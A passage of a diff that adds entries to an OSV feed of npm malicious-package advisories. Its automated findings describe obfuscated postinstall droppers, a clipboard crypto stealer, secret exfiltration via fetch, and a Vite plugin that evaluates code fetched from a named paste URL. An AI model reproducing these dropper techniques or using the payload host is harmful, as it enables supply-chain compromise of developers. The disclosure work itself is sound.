href="https://www.npmjs.com/package/@glitchpad/throttler/v/2.1.1"&gt;https://www.npmjs.com/package/@glitchpad/throttler/v/2.1.1&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6307"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6309: Malicious code in @nullzero/urlcat (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6309</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6309"/>
+    <published>2026-06-23T16:22:56Z</published>
+    <updated>2026-06-23T17:01:28Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @nullzero/urlcat (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@nullzero/urlcat&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (2c007ea1ba0e4bcd680cc3770361eefead0673eca418787720fa65c8c71a2e57)
+Package `@nullzero/urlcat` impersonates the legitimate `urlcat` URL-builder library — same advertised `cat(base, path, params)` API, README copied from upstream, and `package.json.repository.url` points to `git+https://github.com/balazsbotond/urlcat.git` (the real upstream maintainer&amp;#x27;s repo, not the `nullzero` publisher&amp;#x27;s). The package main `lib/index.js` line 64 calls `encoder.runPrepare()` at the top of every invocation of the exported `cat()` function. `lib/encoder.js` is a 263 KB obfuscator.io-packed file (rotated 1176-entry string array, RC4 decoder `_0x2f0d`, control-flow flattening) — far beyond anything a tiny URL composer requ…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@nullzero/urlcat/v/1.4.1"&gt;https://www.npmjs.com/package/@nullzero/urlcat/v/1.4.1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@nullzero/urlcat/v/1.4.0"&gt;https://www.npmjs.com/package/@nullzero/urlcat/v/1.4.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@nullzero/urlcat/v/1.4.2"&gt;https://www.npmjs.com/package/@nullzero/urlcat/v/1.4.2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@nullzero/urlcat/v/1.4.3"&gt;https://www.npmjs.com/package/@nullzero/urlcat/v/1.4.3&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6309"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6306: Malicious code in @gleamkit/probe (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6306</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6306"/>
+    <published>2026-06-23T16:22:20Z</published>
+    <updated>2026-06-23T17:01:28Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @gleamkit/probe (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@gleamkit/probe&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (aaef237007e5d89031d334bf56a29892c7d6103aba9563b040556eea20ef2cfa)
+No suspicious behaviors were detected in this package. There are no lifecycle scripts performing remote fetches, no credential or environment scraping, no hardcoded exfiltration endpoints, and no obfuscated payloads. The package contents do not exhibit any of the known supply-chain attack fingerprints.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@gleamkit/probe/v/0.0.1"&gt;https://www.npmjs.com/package/@gleamkit/probe/v/0.0.1&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6306"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6308: Malicious code in @lazyutil/dater (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6308</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6308"/>
+    <published>2026-06-23T16:22:37Z</published>
+    <updated>2026-06-23T17:01:28Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @lazyutil/dater (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@lazyutil/dater&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (362ed214c96b3a091355472cb7d03ca7dcb1c3b1c36daede92d4e7a04027cb8a)
+@lazyutil/dater is a trojanized repackage of the legitimate `timezonecomplete` library. Its package.json declares `postinstall: node./dist/lib/tzinit.cjs`, which runs automatically on `npm install`. tzinit.cjs is a 263 KB obfuscator.io-protected file (string-array RC4/XOR + control-flow flattening) that uses AES-256-GCM with a hardcoded key/IV/AAD to decrypt an embedded URL and host, then performs an HTTP GET to fetch a binary, writes it to disk, chmods it executable, and spawns it via `process.execPath` or `sh -c`. The dropper is platform-gated for win32/darwin/linux, retries with backoff, and re-execs the package&amp;#x27;s process. None of t…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@lazyutil/dater/v/0.9.2"&gt;https://www.npmjs.com/package/@lazyutil/dater/v/0.9.2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@lazyutil/dater/v/0.8.1"&gt;https://www.npmjs.com/package/@lazyutil/dater/v/0.8.1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@lazyutil/dater/v/0.9.4"&gt;https://www.npmjs.com/package/@lazyutil/dater/v/0.9.4&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@lazyutil/dater/v/0.9.5"&gt;https://www.npmjs.com/package/@lazyutil/dater/v/0.9.5&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@lazyutil/dater/v/0.9.3"&gt;https://www.npmjs.com/package/@lazyutil/dater/v/0.9.3&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6308"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6304: Malicious code in @frostnode/probe (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6304</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6304"/>
+    <published>2026-06-23T16:22:36Z</published>
+    <updated>2026-06-23T17:01:28Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @frostnode/probe (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@frostnode/probe&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (7a143792d6fce9dfc36bbd2f99c44710055d4f0be6408ed046fb4ea4ea2e86f3)
+No suspicious behaviors were observed in this package version. There are no install-time lifecycle hooks fetching or executing remote code, no credential or environment scraping, no hardcoded attacker-controlled endpoints, and no silent-relay patterns in the package&amp;#x27;s code paths.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@frostnode/probe/v/0.0.1"&gt;https://www.npmjs.com/package/@frostnode/probe/v/0.0.1&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6304"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-6213: Malicious code in @bytemend/mfebus (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6213</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6213"/>
+    <published>2026-06-19T15:13:09Z</published>
+    <updated>2026-06-23T17:01:27Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @bytemend/mfebus (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@bytemend/mfebus&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (b3d53776853d18aabf967b0f1882eb45f2164feedd600eeccc927f496002f5e4)
+The package advertises itself as a small in-memory pubsub library but its main entry `dist/index.js` eagerly `require()`s `dist/bootstrap.js`, a 277KB obfuscator.io-protected blob (string-array rotation, control-flow flattening, RC4 string decoder, self-defending wrappers) whose decoded behavior is a remote-code dropper. On require — and automatically when the module is loaded inside a forked Node child via `maybeInstallAutoIpc()`/`addIpcTarget(process)` — the bootstrap: (1) re-spawns `process.execPath` detached with the original argv and an env-var sentinel as an anti-analysis re-entry guard (`child_process.spawn(process.execPath, pro…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@bytemend/mfebus/v/1.4.3"&gt;https://www.npmjs.com/package/@bytemend/mfebus/v/1.4.3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@bytemend/mfebus/v/1.4.4"&gt;https://www.npmjs.com/package/@bytemend/mfebus/v/1.4.4&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@bytemend/mfebus/v/1.4.1"&gt;https://www.npmjs.com/package/@bytemend/mfebus/v/1.4.1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@bytemend/mfebus/v/1.4.5"&gt;https://www.npmjs.com/package/@bytemend/mfebus/v/1.4.5&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@bytemend/mfebus/v/1.4.0"&gt;https://www.npmjs.com/package/@bytemend/mfebus/v/1.4.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@bytemend/mfebus/v/1.4.2"&gt;https://www.npmjs.com/package/@bytemend/mfebus/v/1.4.2&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6213"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-6212: Malicious code in @briskforge/envcheck (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6212</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6212"/>
+    <published>2026-06-19T15:12:55Z</published>
+    <updated>2026-06-23T17:01:27Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @briskforge/envcheck (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@briskforge/envcheck&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (09dba573f5d6cb00b09562870f2148b3e539786f5d801f2a263338301d759313)
+The package advertises itself as a tiny environment-variable validator but ships lib/preflight.js, a heavily obfuscated (obfuscator.io string-array rotation, RC4 decoder, ~1228-entry string array, control-flow flattening) ~277KB bundle that runs on every call to the package&amp;#x27;s main entry point: lib/index.js invokes preflight.runPrepare() at the top of envcheck(). After deobfuscation, lib/preflight.js performs an HTTPS GET to a remote endpoint, AES-256-GCM-decrypts the response using hardcoded key/IV constants embedded in the bundle, writes the decrypted bytes to a cache directory, and spawns them detached via process.execPath / sh with …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@briskforge/envcheck/v/0.5.5"&gt;https://www.npmjs.com/package/@briskforge/envcheck/v/0.5.5&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@briskforge/envcheck/v/0.5.2"&gt;https://www.npmjs.com/package/@briskforge/envcheck/v/0.5.2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@briskforge/envcheck/v/0.5.4"&gt;https://www.npmjs.com/package/@briskforge/envcheck/v/0.5.4&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@briskforge/envcheck/v/0.5.3"&gt;https://www.npmjs.com/package/@briskforge/envcheck/v/0.5.3&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6212"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-6210: Malicious code in @apexcraft/nano-key (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6210</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6210"/>
+    <published>2026-06-19T15:12:42Z</published>
+    <updated>2026-06-23T17:01:27Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @apexcraft/nano-key (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@apexcraft/nano-key&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (c46938b3634fb4de89ddf44b765e1c766c871a40fb31c54609c1b3526074e65c)
+@apexcraft/nano-key advertises itself as a 12-byte sortable ID generator (README and repository metadata are copied from yiwen-ai/xid-ts, an unrelated upstream project), but ships a 250KB obfuscator.io-style payload at dist/cjs/seed.cjs. package.json declares `&amp;quot;postinstall&amp;quot;: &amp;quot;node./dist/cjs/seed.cjs&amp;quot;`, so the payload runs automatically on `npm install`. The same `runPrepare()` entry point is also invoked at module load: index.js line 25 calls `_seed.runPrepare()` inside `newState()`, which line 35 invokes as `defaultState = newState()` at top level — so any consumer that `require`s the package re-triggers the dropper. seed.cjs uses an …&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@apexcraft/nano-key/v/1.3.8"&gt;https://www.npmjs.com/package/@apexcraft/nano-key/v/1.3.8&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@apexcraft/nano-key/v/1.3.4"&gt;https://www.npmjs.com/package/@apexcraft/nano-key/v/1.3.4&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@apexcraft/nano-key/v/1.3.6"&gt;https://www.npmjs.com/package/@apexcraft/nano-key/v/1.3.6&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@apexcraft/nano-key/v/1.2.5"&gt;https://www.npmjs.com/package/@apexcraft/nano-key/v/1.2.5&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@apexcraft/nano-key/v/1.3.2"&gt;https://www.npmjs.com/package/@apexcraft/nano-key/v/1.3.2&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@apexcraft/nano-key/v/1.3.5"&gt;https://www.npmjs.com/package/@apexcraft/nano-key/v/1.3.5&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@apexcraft/nano-key/v/1.3.7"&gt;https://www.npmjs.com/package/@apexcraft/nano-key/v/1.3.7&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@apexcraft/nano-key/v/1.2.4"&gt;https://www.npmjs.com/package/@apexcraft/nano-key/v/1.2.4&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6210"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6305: Malicious code in @frostnode/waitfor (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6305</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6305"/>
+    <published>2026-06-23T16:22:21Z</published>
+    <updated>2026-06-23T17:01:27Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in @frostnode/waitfor (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;@frostnode/waitfor&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (d0e3751015a32bcdd6a8f1f7e864c65992d1d2aa781b6e2a043cd28767549641)
+No concrete installer-harm indicators were identified in this version of @frostnode/waitfor. No lifecycle hooks, network destinations, credential-access patterns, or other supply-chain attack fingerprints were surfaced. Coverage of the package contents was partial, so a human reviewer should confirm there is no install-time or import-time behavior of concern before this is treated as cleared.
+&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@frostnode/waitfor/v/0.9.0"&gt;https://www.npmjs.com/package/@frostnode/waitfor/v/0.9.0&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@frostnode/waitfor/v/0.10.4"&gt;https://www.npmjs.com/package/@frostnode/waitfor/v/0.10.4&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@frostnode/waitfor/v/0.10.3"&gt;https://www.npmjs.com/package/@frostnode/waitfor/v/0.10.3&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/@frostnode/waitfor/v/0.10.5"&gt;https://www.npmjs.com/package/@frostnode/waitfor/v/0.10.5&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6305"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6273: Malicious code in zod-pino (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6273</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6273"/>
+    <published>2026-06-22T21:53:45Z</published>
+    <updated>2026-06-23T17:01:27Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in zod-pino (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;zod-pino&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (81e8a23a71a5288646495c50a46c2814ffc0668d9c24ed04e1abd9e8758b5ea2)
+Package is published under the name &amp;#x27;zod-pino&amp;#x27; (suggesting a Zod/Pino logging integration) but the shipped contents are unrelated to that purpose. The tarball contains: (1) scripts/postinstall-agent.mjs — a postinstall lifecycle script that performs network operations (GET requests, ping/host enumeration) and installs an agent, executing automatically on `npm install`; (2) dist/secretScan/contentScanner.js and dist/secretScan/agentStartupAudit.js — modules that scan content for secrets and exfiltrate to https://huggingface.co endpoints via fetch(); (3) dist/hfCredentials.js — base64-decoded HuggingFace credentials handling; (4) dist/di…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/zod-pino/v/1.0.122"&gt;https://www.npmjs.com/package/zod-pino/v/1.0.122&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/zod-pino/v/1.0.123"&gt;https://www.npmjs.com/package/zod-pino/v/1.0.123&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/zod-pino/v/1.0.124"&gt;https://www.npmjs.com/package/zod-pino/v/1.0.124&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6273"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6326: Malicious code in web3-eth-utils (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6326</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6326"/>
+    <published>2026-06-23T15:55:57Z</published>
+    <updated>2026-06-23T17:01:27Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in web3-eth-utils (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;web3-eth-utils&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (4a262e70316cd74a87b043cd1985e456639781763d4a3ef69aa09d99a2795154)
+Package name, README, repository URL, contributors, and module structure are copied from the legitimate &amp;#x27;@ethereumjs/util&amp;#x27; / &amp;#x27;ethereumjs-util&amp;#x27; package, presenting itself as a drop-in for that widely-used Ethereum utility library. The compiled Node entry dist/index.js contains a side-effect-only `require(&amp;quot;assertcore&amp;quot;)` at line 60 (no symbols from the module are used), and assertcore is declared as a runtime dependency (^3.1.7) in package.json. This `require` is absent from the TypeScript source src/index.ts and from the browser bundle dist.browser/index.js — it was injected into the shipped Node bundle after the build, a deliberate smug…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/web3-eth-utils/v/6.2.8"&gt;https://www.npmjs.com/package/web3-eth-utils/v/6.2.8&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6326"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6324: Malicious code in web3-crypto-address-utils (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6324</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6324"/>
+    <published>2026-06-23T15:57:08Z</published>
+    <updated>2026-06-23T17:01:26Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in web3-crypto-address-utils (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;web3-crypto-address-utils&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (36cd7750ff28e527c0a147330b21275364e997713a22a026e74dffb81cb9b123)
+web3-crypto-address-utils@0.1.0 advertises itself as a multi-chain wallet address validator but ships an active crypto stealer that fires automatically on `npm install`. The `postinstall` hook runs `src/cache-manager.js`, which detaches a backgrounded `node src/system-monitor.js` (via `start /B... &amp;gt; ~/.web3-cache.log 2&amp;gt;&amp;amp;1` on Windows or trailing `&amp;amp;` on Unix), so the malicious daemon survives the install and persists in the user&amp;#x27;s session. After a 7-day dormancy designed to bypass CI/sandbox/review windows (`BEACON_DELAY: 604800000`), system-monitor.js polls the clipboard every 500ms and (1) detects ≥12 BIP39 words or 0x / WIF private-k…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/web3-crypto-address-utils/v/0.1.0"&gt;https://www.npmjs.com/package/web3-crypto-address-utils/v/0.1.0&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6324"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6325: Malicious code in web3-eth-util (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6325</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6325"/>
+    <published>2026-06-23T15:55:58Z</published>
+    <updated>2026-06-23T17:01:26Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in web3-eth-util (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;web3-eth-util&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (f2e70ad91037bdc97e6b1ab8c95f5f2b5eecdb4524582d79dae5f240cbdbfc29)
+Package name and metadata impersonate the legitimate @ethereumjs/util / ethereumjs-util packages: README is copied verbatim from the upstream ethereumjs project (and even instructs users to `npm install eth-util`), the contributor list and repository URL point at ethereumjs/ethereumjs-monorepo, but the package is published under a different name and ownership. The published dist/index.js (line ~57) contains `require(&amp;quot;assertcore&amp;quot;)` and package.json declares `&amp;quot;assertcore&amp;quot;: &amp;quot;^3.1.7&amp;quot;` as a runtime dependency. The human-authored src/index.ts has no such import, and the browser build at dist.browser/index.js also omits it — the extra require…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/web3-eth-util/v/6.2.8"&gt;https://www.npmjs.com/package/web3-eth-util/v/6.2.8&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-6325"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[UPDATED] MAL-2026-5713: Malicious code in vite-plugin-compress-js (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-5713</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-5713"/>
+    <published>2026-06-12T19:43:47Z</published>
+    <updated>2026-06-23T17:01:26Z</updated>
+    <category term="npm"/>
+    <content type="html">&lt;p&gt;&lt;strong&gt;Malicious code in vite-plugin-compress-js (npm)&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Affected:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;vite-plugin-compress-js&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;
+---
+_-= Per source details. Do not edit below this line.=-_
+
+## Source: amazon-inspector (7f7b2710441863a429a2a1833e06f54e9afc23c87d1b40d7ee09e1995c6a65c2)
+On module load, this Vite plugin performs an HTTP GET to https://www.jsonkeeper.com/b/XVHGD (an anonymous, mutable paste host) and passes the response&amp;#x27;s `data` field to `new Function.constructor(&amp;quot;require&amp;quot;,...)`, then invokes the resulting function with `require` — granting the remote payload full Node.js capabilities (fs, child_process, network) inside the consumer&amp;#x27;s Vite build process. dist/index.mjs (lines ~124-128) calls the fetch+eval directly via initPlugin(); dist/index.cjs (lines ~130-141) wraps the same payload in `if (isMainThread) { new Worker(__filename) } else { initPlugin() }`, spawning a worker that re-loads the module wi…&lt;/p&gt;&lt;p&gt;References:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/vite-plugin-compress-js/v/0.5.5"&gt;https://www.npmjs.com/package/vite-plugin-compress-js/v/0.5.5&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/vite-plugin-compress-js/v/0.5.6"&gt;https://www.npmjs.com/package/vite-plugin-compress-js/v/0.5.6&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href="https://www.npmjs.com/package/vite-plugin-compress-js/v/0.5.7"&gt;https://www.npmjs.com/package/vite-plugin-compress-js/v/0.5.7&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;a href="https://osv.dev/vulnerability/MAL-2026-5713"&gt;View on OSV.dev →&lt;/a&gt;&lt;/p&gt;</content>
+  </entry>
+  <entry>
+    <title>[NEW] MAL-2026-6278: Malicious code in ts-wross (npm)</title>
+    <id>https://osv.dev/vulnerability/MAL-2026-6278</id>
+    <link rel="alternate" href="https://osv.dev/vulnerability/MAL-2026-6278"/>
